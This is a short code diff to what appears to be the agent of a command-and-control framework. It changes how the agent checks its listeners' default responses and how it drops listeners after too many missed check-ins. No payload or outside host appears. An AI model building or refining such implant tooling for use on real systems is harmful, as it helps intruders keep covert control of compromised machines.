@@ -108,7 +108,7 @@ def send_message(data = None):
                 result = build_response_packet(0, str('[!] Failed to check job buffer!: ' + str(e)))
                 process_job_tasking(result)
 
-            if data == listener['defaultResponse']:
+            if data == base64.b64decode(listener['defaultResponse']):
                 listener['missedCheckins'] = 0
             else:
                 decode_routing_packet(data)
@@ -119,7 +119,7 @@ def send_message(data = None):
             listener['missedCheckins'] += 1
 
     #remove dead listeners from list
-    listeners = [ item for item in listeners if item['name'] not dead_listeners_name ]
+    listeners = [ item for item in listeners if item['missedCheckins'] < item['lostLimit'] ]
 
     return
 
